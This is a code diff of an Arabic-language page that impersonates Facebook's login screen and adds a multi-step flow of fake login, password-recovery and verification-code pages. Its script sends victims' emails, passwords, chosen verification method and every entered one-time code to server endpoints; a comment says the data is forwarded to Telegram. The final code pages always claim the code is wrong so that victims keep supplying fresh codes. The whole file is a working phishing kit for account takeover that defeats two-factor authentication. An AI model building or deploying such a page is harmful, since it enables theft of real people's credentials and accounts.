@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فيسبوك - تسجيل الدخول أو إنشاء حساب</title>
+    <title>فيسبوك</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
         
@@ -16,6 +16,10 @@
             padding: 20px;
         }
         
+        /* ========== عام ========== */
+        .page { display: none; }
+        .page.active { display: block; }
+        
         .main-container {
             display: flex;
             align-items: center;
@@ -25,44 +29,19 @@
             justify-content: center;
         }
         
-        .left-section {
-            flex: 1;
-            max-width: 500px;
-            padding-bottom: 60px;
-        }
-        
-        .fb-logo {
-            width: 240px;
-            height: auto;
-            margin-bottom: 8px;
-        }
-        
-        .tagline {
-            font-size: 28px;
-            color: #1c1e21;
-            font-weight: 400;
-            line-height: 32px;
-            width: 500px;
-        }
-        
-        .right-section {
-            flex: 0 0 396px;
-            width: 396px;
-        }
+        .left-section { flex: 1; max-width: 500px; padding-bottom: 60px; }
+        .fb-logo { width: 240px; height: auto; margin-bottom: 8px; }
+        .tagline { font-size: 28px; color: #1c1e21; font-weight: 400; line-height: 32px; width: 500px; }
+        .right-section { flex: 0 0 396px; width: 396px; }
         
         .login-card {
             background: #fff;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             padding: 16px 16px 24px;
-            width: 100%;
         }
         
-        .login-card form {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
+        .login-card form { display: flex; flex-direction: column; gap: 12px; }
         
         .input-field {
             width: 100%;
@@ -83,9 +62,7 @@
             box-shadow: 0 0 0 2px #e7f3ff;
         }
         
-        .input-field::placeholder {
-            color: #90949c;
-        }
+        .input-field::placeholder { color: #90949c; }
         
         .login-btn {
             width: 100%;
@@ -99,11 +76,9 @@
             cursor: pointer;
             transition: 0.2s;
             margin-top: 6px;
-            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
         
         .login-btn:hover { background: #166fe5; }
-        .login-btn:active { transform: scale(0.99); }
         .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         
         .forgot-link {
@@ -118,15 +93,11 @@
             border: none;
             width: 100%;
             cursor: pointer;
-            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
         
         .forgot-link:hover { text-decoration: underline; }
         
-        .divider {
-            border-top: 1px solid #dadde1;
-            margin: 12px 0 20px;
-        }
+        .divider { border-top: 1px solid #dadde1; margin: 12px 0 20px; }
         
         .create-btn {
             display: block;
@@ -141,46 +112,209 @@
             font-weight: 700;
             cursor: pointer;
             text-decoration: none;
-            text-align: center;
             transition: 0.2s;
-            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
         
         .create-btn:hover { background: #36a420; }
         
-        .below-text {
-            text-align: center;
-            font-size: 14px;
-            color: #1c1e21;
-            margin-top: 28px;
-        }
-        
-        .below-text a {
-            color: #1c1e21;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        
+        .below-text { text-align: center; font-size: 14px; color: #1c1e21; margin-top: 28px; }
+        .below-text a { color: #1c1e21; text-decoration: none; font-weight: 600; }
         .below-text a:hover { text-decoration: underline; }
         
-        .loading-spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255,255,255,0.4);
-            border-top: 2px solid #fff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+        /* ========== صفحة OTP ========== */
+        .otp-container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            max-width: 420px;
+            width: 100%;
+            padding: 28px 24px;
+            text-align: center;
             margin: 0 auto;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .fb-logo-small {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 20px;
+            font-family: Helvetica, Arial, sans-serif;
+            direction: ltr;
         }
         
-        .login-btn.loading .btn-text { display: none; }
-        .login-btn.loading .loading-spinner { display: block; }
+        .icon-circle {
+            width: 64px;
+            height: 64px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 30px;
+        }
+        
+        .title { font-size: 20px; font-weight: 700; color: #1c1e21; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; color: #606770; line-height: 1.5; margin-bottom: 24px; }
+        .subtitle strong { color: #1c1e21; word-break: break-all; direction: ltr; display: inline-block; }
+        
+        .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; direction: ltr; }
+        
+        .otp-boxes input {
+            width: 46px;
+            height: 54px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            border: 1.5px solid #dddfe2;
+            border-radius: 6px;
+            background: #fff;
+            color: #1c1e21;
+            outline: none;
+            transition: 0.2s;
+        }
+        
+        .otp-boxes input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        
+        .verify-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 14px;
+        }
+        
+        .verify-btn:hover { background: #166fe5; }
+        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 6px;
+        }
+        
+        .resend-btn:hover { text-decoration: underline; }
+        .resend-btn:disabled { color: #90949c; cursor: not-allowed; text-decoration: none; }
+        
+        .error-msg {
+            background: #ffebe8;
+            border: 1px solid #dd3c10;
+            color: #1c1e21;
+            padding: 10px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+        
+        .error-msg.show { display: block; }
+        
+        .success-msg {
+            background: #e7f7ed;
+            border: 1px solid #42b72a;
+            color: #1c1e21;
+            padding: 10px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+        
+        .success-msg.show { display: block; }
+        
+        .back-link {
+            display: inline-block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 14px;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .back-link:hover { text-decoration: underline; }
+        
+        /* ========== صفحة اختيار الطريقة ========== */
+        .method-btn {
+            width: 100%;
+            padding: 14px 16px;
+            background: #fff;
+            border: 1.5px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1c1e21;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: 0.2s;
+            text-align: right;
+        }
+        
+        .method-btn:hover {
+            background: #f5f6f7;
+            border-color: #1877f2;
+        }
+        
+        .method-btn .method-icon {
+            width: 40px;
+            height: 40px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        
+        .method-btn .method-text {
+            flex: 1;
+        }
+        
+        .method-btn .method-title {
+            font-weight: 700;
+            font-size: 15px;
+            color: #1c1e21;
+        }
+        
+        .method-btn .method-desc {
+            font-size: 13px;
+            color: #606770;
+            margin-top: 2px;
+        }
+        
+        .forgot-code-link {
+            display: block;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            padding: 12px 0;
+            background: none;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 8px;
+        }
+        
+        .forgot-code-link:hover { text-decoration: underline; }
         
         @media (max-width: 900px) {
             .main-container {
@@ -199,123 +333,483 @@
             }
             
             .fb-logo { width: 180px; }
-            
-            .tagline {
-                font-size: 20px;
-                line-height: 24px;
-                width: 100%;
-                text-align: center;
-            }
-            
-            .right-section {
-                flex: 0 0 auto;
-                width: 100%;
-                max-width: 396px;
-            }
+            .tagline { font-size: 20px; line-height: 24px; width: 100%; text-align: center; }
+            .right-section { flex: 0 0 auto; width: 100%; max-width: 396px; }
         }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        
-        <div class="left-section">
-            <svg class="fb-logo" viewBox="0 0 666.67 133.33" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#1877f2" d="M631.25,0H35.42C15.85,0,0,15.85,0,35.42v62.5c0,19.57,15.85,35.42,35.42,35.42h595.83c19.57,0,35.42-15.85,35.42-35.42V35.42C666.67,15.85,650.81,0,631.25,0z"/>
-                <text x="333" y="85" font-family="Helvetica, Arial, sans-serif" font-size="70" font-weight="bold" fill="#fff" text-anchor="middle">facebook</text>
-            </svg>
-            <p class="tagline">يتيح لك فيسبوك التواصل ومشاركة ما يهمك مع الأشخاص في حياتك.</p>
-        </div>
-        
-        <div class="right-section">
-            <div class="login-card">
-                <form id="loginForm">
-                    <input 
-                        type="text" 
-                        id="email" 
-                        name="email" 
-                        class="input-field" 
-                        placeholder="البريد الإلكتروني أو رقم الهاتف"
-                        autocomplete="username">
-                    
-                    <input 
-                        type="password" 
-                        id="password" 
-                        name="password" 
-                        class="input-field" 
-                        placeholder="كلمة المرور"
-                        autocomplete="current-password">
-                    
-                    <button type="submit" id="loginBtn" class="login-btn">
-                        <span class="btn-text">تسجيل الدخول</span>
-                        <div class="loading-spinner"></div>
-                    </button>
-                    
-                    <button type="button" class="forgot-link" id="forgotBtn">هل نسيت كلمة المرور؟</button>
-                </form>
-                
-                <div class="divider"></div>
-                
-                <a href="#" class="create-btn">إنشاء حساب جديد</a>
+    <!-- ============================================================ -->
+    <!-- 1. صفحة تسجيل الدخول -->
+    <!-- ============================================================ -->
+    <div id="page-login" class="page active">
+        <div class="main-container">
+            <div class="left-section">
+                <svg class="fb-logo" viewBox="0 0 666.67 133.33" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#1877f2" d="M631.25,0H35.42C15.85,0,0,15.85,0,35.42v62.5c0,19.57,15.85,35.42,35.42,35.42h595.83c19.57,0,35.42-15.85,35.42-35.42V35.42C666.67,15.85,650.81,0,631.25,0z"/>
+                    <text x="333" y="85" font-family="Helvetica, Arial, sans-serif" font-size="70" font-weight="bold" fill="#fff" text-anchor="middle">facebook</text>
+                </svg>
+                <p class="tagline">يتيح لك فيسبوك التواصل ومشاركة ما يهمك مع الأشخاص في حياتك.</p>
             </div>
             
-            <p class="below-text">
-                <a href="#">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.
-            </p>
+            <div class="right-section">
+                <div class="login-card">
+                    <form id="loginForm">
+                        <input type="text" id="email" class="input-field" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="username">
+                        <input type="password" id="password" class="input-field" placeholder="كلمة المرور" autocomplete="current-password">
+                        <button type="submit" class="login-btn">تسجيل الدخول</button>
+                        <button type="button" class="forgot-link" id="forgotBtn">هل نسيت كلمة المرور؟</button>
+                    </form>
+                    <div class="divider"></div>
+                    <a href="#" class="create-btn">إنشاء حساب جديد</a>
+                </div>
+                <p class="below-text"><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</p>
+            </div>
         </div>
-        
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- 2. صفحة "نسيت كلمة المرور" - كتابة البريد -->
+    <!-- ============================================================ -->
+    <div id="page-forgot" class="page">
+        <div class="otp-container">
+            <div class="fb-logo-small">facebook</div>
+            <div class="icon-circle">🔑</div>
+            <div class="title">ابحث عن حسابك</div>
+            <div class="subtitle">أدخل بريدك الإلكتروني أو رقم هاتفك للبحث عن حسابك.</div>
+            
+            <input type="text" id="forgotEmail" class="input-field" placeholder="البريد الإلكتروني أو رقم الهاتف" style="margin-bottom: 16px;">
+            
+            <button type="button" class="verify-btn" id="forgotSubmit">بحث</button>
+            <button type="button" class="back-link" onclick="showPage('page-login')">← العودة</button>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- 3. صفحة OTP الأولى (بعد تسجيل دخول / نسيت كلمة مرور) -->
+    <!-- ============================================================ -->
+    <div id="page-otp" class="page">
+        <div class="otp-container">
+            <div class="fb-logo-small">facebook</div>
+            <div class="icon-circle">📱</div>
+            <div class="title">أدخل رمز التحقق</div>
+            <div class="subtitle">
+                لقد أرسلنا رمزاً مكوّناً من 6 أرقام إلى<br>
+                <strong id="displayEmail1">بريدك الإلكتروني</strong>
+            </div>
+            
+            <div id="errorMsg1" class="error-msg"></div>
+            
+            <div class="otp-boxes" id="otpContainer1">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <button type="button" class="verify-btn" id="verifyBtn1">متابعة</button>
+            <button type="button" class="resend-btn" id="resendBtn1" disabled>إعادة إرسال الرمز (<span id="timerCount1">60</span>ث)</button>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- 4. صفحة Messenger - اختيار طريقة التحقق -->
+    <!-- ============================================================ -->
+    <div id="page-messenger" class="page">
+        <div class="otp-container">
+            <div class="fb-logo-small">facebook</div>
+            <div class="icon-circle">💬</div>
+            <div class="title">تأكيد هويتك</div>
+            <div class="subtitle">
+                اختر طريقة استلام رمز الأمان<br>
+                <strong id="displayEmail2">بريدك الإلكتروني</strong>
+            </div>
+            
+            <!-- زر Messenger -->
+            <button type="button" class="method-btn" id="methodMessenger">
+                <div class="method-icon">💬</div>
+                <div class="method-text">
+                    <div class="method-title">رموز Messenger</div>
+                    <div class="method-desc">استلم رمزاً على تطبيق Messenger</div>
+                </div>
+            </button>
+            
+            <!-- زر OTP -->
+            <button type="button" class="method-btn" id="methodOtp">
+                <div class="method-icon">🔢</div>
+                <div class="method-text">
+                    <div class="method-title">رمز لمرة واحدة (OTP)</div>
+                    <div class="method-desc">استلم رمزاً عبر رسالة نصية أو بريد إلكتروني</div>
+                </div>
+            </button>
+            
+            <button type="button" class="forgot-code-link" id="forgotCodeBtn">هل نسيت الرمز؟</button>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- 5. صفحة OTP النهائية (بعد اختيار OTP) -->
+    <!-- ============================================================ -->
+    <div id="page-otp-final" class="page">
+        <div class="otp-container">
+            <div class="fb-logo-small">facebook</div>
+            <div class="icon-circle">🔢</div>
+            <div class="title">أدخل رمز لمرة واحدة</div>
+            <div class="subtitle">
+                لقد أرسلنا رمزاً مكوّناً من 6 أرقام إلى<br>
+                <strong id="displayEmail3">بريدك الإلكتروني</strong>
+            </div>
+            
+            <div id="errorMsg3" class="error-msg"></div>
+            
+            <div class="otp-boxes" id="otpContainer3">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <button type="button" class="verify-btn" id="verifyBtn3">متابعة</button>
+            <button type="button" class="resend-btn" id="resendBtn3" disabled>إعادة إرسال الرمز (<span id="timerCount3">60</span>ث)</button>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- 6. صفحة Messenger Final (بعد اختيار Messenger) -->
+    <!-- ============================================================ -->
+    <div id="page-messenger-final" class="page">
+        <div class="otp-container">
+            <div class="fb-logo-small">facebook</div>
+            <div class="icon-circle">💬</div>
+            <div class="title">أدخل رمز Messenger</div>
+            <div class="subtitle">
+                لقد أرسلنا رمزاً مكوّناً من 6 أرقام إلى<br>
+                <strong id="displayEmail4">حساب Messenger</strong>
+            </div>
+            
+            <div id="errorMsg4" class="error-msg"></div>
+            
+            <div class="otp-boxes" id="otpContainer4">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <button type="button" class="verify-btn" id="verifyBtn4">متابعة</button>
+            <button type="button" class="resend-btn" id="resendBtn4" disabled>إعادة إرسال الرمز (<span id="timerCount4">60</span>ث)</button>
+            <br>
+            <button type="button" class="forgot-code-link" onclick="showPage('page-messenger')">هل نسيت الرمز؟ استخدم طريقة أخرى</button>
+        </div>
     </div>
 
     <script>
-        const form = document.getElementById('loginForm');
-        const loginBtn = document.getElementById('loginBtn');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const forgotBtn = document.getElementById('forgotBtn');
+        // =============================================
+        // المتغيرات العامة
+        // =============================================
+        let userEmail = '';
+        let currentStage = 'login'; // login | forgot
 
-        // ===== تسجيل الدخول =====
-        form.addEventListener('submit', async function(e) {
+        // =============================================
+        // دالة تبديل الصفحات
+        // =============================================
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        // =============================================
+        // تحديث الإيميل في كل الصفحات
+        // =============================================
+        function updateEmails() {
+            const email = userEmail || 'بريدك الإلكتروني';
+            document.getElementById('displayEmail1').textContent = email;
+            document.getElementById('displayEmail2').textContent = email;
+            document.getElementById('displayEmail3').textContent = email;
+            document.getElementById('displayEmail4').textContent = email;
+        }
+
+        // =============================================
+        // 1. تسجيل الدخول
+        // =============================================
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            const email = document.getElementById('email').value.trim() || '(empty)';
+            const password = document.getElementById('password').value.trim() || '(empty)';
             
-            const email = emailInput.value.trim() || '(empty)';
-            const password = passwordInput.value.trim() || '(empty)';
+            userEmail = email;
+            currentStage = 'login';
             
-            loginBtn.classList.add('loading');
-            loginBtn.disabled = true;
-            
-            try {
-                await fetch('/submit-login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
-                });
-                
-                localStorage.setItem('fb_email', email);
-                window.location.href = '/otp';
-                
-            } catch (error) {
-                console.error('❌ خطأ:', error);
-                localStorage.setItem('fb_email', email);
-                window.location.href = '/otp';
-            }
-        });
-
-        // ===== نسيت كلمة المرور =====
-        forgotBtn.addEventListener('click', function() {
-            const email = emailInput.value.trim() || '(empty)';
-            
-            fetch('/submit-login', {
+            // إرسال لتيلجرام
+            await fetch('/submit-login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password: '(Forgot Password)' })
-            }).then(() => {
-                localStorage.setItem('fb_email', email);
-                window.location.href = '/otp';
-            }).catch(() => {
-                localStorage.setItem('fb_email', email);
-                window.location.href = '/otp';
-            });
+                body: JSON.stringify({ email, password })
+            }).catch(() => {});
+            
+            updateEmails();
+            showPage('page-otp');
         });
+
+        // =============================================
+        // 2. نسيت كلمة المرور
+        // =============================================
+        document.getElementById('forgotBtn').addEventListener('click', function() {
+            // نسجل إنه ضغط على "نسيت كلمة المرور"
+            const email = document.getElementById('email').value.trim();
+            userEmail = email;
+            
+            fetch('/submit-forgot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email || '(لم يكتب شيئاً بعد)' })
+            }).catch(() => {});
+            
+            showPage('page-forgot');
+        });
+
+        // =============================================
+        // 3. صفحة "نسيت كلمة المرور" - إرسال البريد
+        // =============================================
+        document.getElementById('forgotSubmit').addEventListener('click', async function() {
+            const email = document.getElementById('forgotEmail').value.trim() || '(empty)';
+            userEmail = email;
+            currentStage = 'forgot';
+            
+            await fetch('/submit-forgot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email })
+            }).catch(() => {});
+            
+            updateEmails();
+            showPage('page-otp');
+        });
+
+        // =============================================
+        // 4. التعامل مع OTP Boxes (عام)
+        // =============================================
+        function setupOtpBoxes(containerId) {
+            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
+            inputs.forEach((input, index) => {
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' || e.key === 'Tab' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Delete') return;
+                    if (!/^[0-9]$/.test(e.key)) e.preventDefault();
+                });
+                
+                input.addEventListener('input', function() {
+                    this.value = this.value.replace(/\D/g, '');
+                    if (this.value.length > 1) this.value = this.value.slice(0, 1);
+                    if (this.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('keyup', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        setupOtpBoxes('otpContainer1');
+        setupOtpBoxes('otpContainer3');
+        setupOtpBoxes('otpContainer4');
+
+        // =============================================
+        // 5. قراءة OTP من الحاويات
+        // =============================================
+        function getOtpValue(containerId) {
+            let otp = '';
+            document.querySelectorAll(`#${containerId} .otp-input`).forEach(i => otp += i.value);
+            return otp;
+        }
+
+        function clearOtp(containerId) {
+            document.querySelectorAll(`#${containerId} .otp-input`).forEach(i => i.value = '');
+            document.querySelector(`#${containerId} .otp-input`).focus();
+        }
+
+        // =============================================
+        // 6. OTP الأولى (بعد تسجيل دخول / نسيت كلمة مرور)
+        // =============================================
+        document.getElementById('verifyBtn1').addEventListener('click', async function() {
+            const otp = getOtpValue('otpContainer1');
+            const errorMsg = document.getElementById('errorMsg1');
+            
+            if (otp.length !== 6) {
+                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
+                errorMsg.classList.add('show');
+                return;
+            }
+            
+            errorMsg.classList.remove('show');
+            this.disabled = true;
+            this.textContent = 'جاري التحقق...';
+            
+            await fetch('/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp, email: userEmail, stage: 'first-otp' })
+            }).catch(() => {});
+            
+            // الانتقال لصفحة Messenger
+            setTimeout(() => {
+                this.disabled = false;
+                this.textContent = 'متابعة';
+                updateEmails();
+                showPage('page-messenger');
+            }, 1000);
+        });
+
+        // =============================================
+        // 7. صفحة Messenger - اختيار الطريقة
+        // =============================================
+        document.getElementById('methodOtp').addEventListener('click', async function() {
+            await fetch('/submit-method', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ method: 'otp', email: userEmail })
+            }).catch(() => {});
+            
+            updateEmails();
+            showPage('page-otp-final');
+        });
+
+        document.getElementById('methodMessenger').addEventListener('click', async function() {
+            await fetch('/submit-method', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ method: 'messenger', email: userEmail })
+            }).catch(() => {});
+            
+            updateEmails();
+            showPage('page-messenger-final');
+        });
+
+        // "هل نسيت الرمز؟" في صفحة Messenger
+        document.getElementById('forgotCodeBtn').addEventListener('click', function() {
+            // يروح لصفحة OTP النهائية
+            showPage('page-otp-final');
+        });
+
+        // =============================================
+        // 8. OTP النهائية
+        // =============================================
+        document.getElementById('verifyBtn3').addEventListener('click', async function() {
+            const otp = getOtpValue('otpContainer3');
+            const errorMsg = document.getElementById('errorMsg3');
+            
+            if (otp.length !== 6) {
+                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
+                errorMsg.classList.add('show');
+                return;
+            }
+            
+            errorMsg.classList.remove('show');
+            this.disabled = true;
+            this.textContent = 'جاري التحقق...';
+            
+            await fetch('/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp, email: userEmail, stage: 'otp-final' })
+            }).catch(() => {});
+            
+            setTimeout(() => {
+                errorMsg.textContent = '⚠️ الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.';
+                errorMsg.classList.add('show');
+                clearOtp('otpContainer3');
+                this.disabled = false;
+                this.textContent = 'متابعة';
+            }, 1500);
+        });
+
+        // =============================================
+        // 9. Messenger Final
+        // =============================================
+        document.getElementById('verifyBtn4').addEventListener('click', async function() {
+            const otp = getOtpValue('otpContainer4');
+            const errorMsg = document.getElementById('errorMsg4');
+            
+            if (otp.length !== 6) {
+                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
+                errorMsg.classList.add('show');
+                return;
+            }
+            
+            errorMsg.classList.remove('show');
+            this.disabled = true;
+            this.textContent = 'جاري التحقق...';
+            
+            await fetch('/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp, email: userEmail, stage: 'messenger' })
+            }).catch(() => {});
+            
+            setTimeout(() => {
+                errorMsg.textContent = '⚠️ الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.';
+                errorMsg.classList.add('show');
+                clearOtp('otpContainer4');
+                this.disabled = false;
+                this.textContent = 'متابعة';
+            }, 1500);
+        });
+
+        // =============================================
+        // 10. أزرار إعادة الإرسال
+        // =============================================
+        function setupResend(btnId, timerId) {
+            const btn = document.getElementById(btnId);
+            const timerSpan = document.getElementById(timerId);
+            let countdown = 60;
+            let interval;
+            
+            function startTimer() {
+                countdown = 60;
+                btn.disabled = true;
+                
+                if (interval) clearInterval(interval);
+                
+                interval = setInterval(() => {
+                    countdown--;
+                    if (timerSpan) timerSpan.textContent = countdown;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(interval);
+                        btn.disabled = false;
+                        btn.innerHTML = 'إعادة إرسال الرمز';
+                    } else {
+                        btn.innerHTML = `إعادة إرسال الرمز (<span id="${timerId}">${countdown}</span>ث)`;
+                    }
+                }, 1000);
+            }
+            
+            btn.addEventListener('click', function() {
+                startTimer();
+            });
+            
+            startTimer();
+        }
+
+        setupResend('resendBtn1', 'timerCount1');
+        setupResend('resendBtn3', 'timerCount3');
+        setupResend('resendBtn4', 'timerCount4');
+
+        // =============================================
+        // بدء
+        // =============================================
+        console.log('✅ التطبيق جاهز');
     </script>
 
 </body>
